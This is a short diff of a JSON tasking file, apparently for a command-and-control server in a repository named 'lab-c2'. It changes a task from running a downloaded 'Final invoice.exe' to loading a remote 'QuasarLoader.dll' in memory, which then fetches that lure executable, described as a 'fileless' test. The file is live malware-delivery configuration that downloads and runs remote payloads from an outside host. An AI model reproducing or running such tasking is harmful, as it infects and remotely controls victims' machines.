@@ -1,9 +1,12 @@
 {
-  "id": "lab-525-092",
+  "id": "fileless_final_test",
   "tasks": [
     {
-      "action": "run_exe",
-      "url": "https://raw.githubusercontent.com/g00glecenter101-arch/lab-c2/refs/heads/main/Final%20invoice.exe"
+      "action": "run_dll",
+      "url": "https://raw.githubusercontent.com/g00glecenter101-arch/lab-c2/refs/heads/main/QuasarLoader.dll",
+      "class": "QuasarLoader",
+      "method": "Load",
+      "args": ["https://raw.githubusercontent.com/g00glecenter101-arch/lab-c2/refs/heads/main/Final%20invoice.exe"]
     }
   ]
 }
